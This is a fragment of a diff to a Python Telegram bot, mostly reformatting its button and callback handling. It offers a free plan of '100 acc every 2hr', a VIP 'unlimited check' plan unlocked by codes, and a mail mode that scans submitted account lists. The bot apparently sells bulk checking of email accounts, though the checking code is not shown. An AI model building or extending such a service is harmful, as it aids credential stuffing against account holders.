+                                    send_message(chat_id,
+                                        f"User: {uid}\nCode: {info.get('code','')}\n"
+                                        f"Remaining: {rem}h",
+                                        reply_markup={"inline_keyboard": [[
+                                            {"text": "Revoke",
+                                             "callback_data": f"REVOKE_{uid}"}
+                                        ]]})
                             continue
 
                         if data.startswith("STOP_"):
@@ -1836,8 +1670,10 @@ class BotApp:
                             if sess:
                                 sess.plan = "vip"
                                 sess.awaiting_vip_code = True
-                                kb = {"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
-                                send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
+                                kb = {"inline_keyboard": [[{"text": "Cancel",
+                                    "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
+                                send_message(chat_id, "Please enter your VIP code:",
+                                    reply_markup=kb)
                         elif data.startswith("PLAN_CANCEL_"):
                             with self.lock:
                                 sess = self.sessions.get(chat_id)
@@ -1853,27 +1689,32 @@ class BotApp:
                         elif data.startswith("SKIP_"):
                             with self.lock:
                                 sess = self.sessions.get(chat_id)
-                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
+                            if (sess and getattr(sess, "awaiting_domain", False)
+                                    and sess.pending_accounts):
                                 sess.awaiting_domain = False
                                 accs = sess.pending_accounts
                                 sess.pending_accounts = None
-                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
-                                t.start()
+                                threading.Thread(target=self.start_scan,
+                                    args=(chat_id, accs), daemon=True).start()
                         elif data == "MODE_MAIL":
                             with self.lock:
                                 sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                 self.sessions[chat_id] = sess
                             kb = {
                                 "inline_keyboard": [
-                                    [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
-                                    [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
+                                    [{"text": "Free ( 100 acc every 2hr )",
+                                      "callback_data": f"PLAN_FREE_{chat_id}"}],
+                                    [{"text": "Vip ( unlimited check )",
+                                      "callback_data": f"PLAN_VIP_{chat_id}"}]
                                 ]
                             }
                             send_message(chat_id, "Choose your plan to start:", reply_markup=kb)
+
             except KeyboardInterrupt:
                 break
             except Exception:
                 time.sleep(2)
+
 
 if __name__ == "__main__":
     BotApp().run()
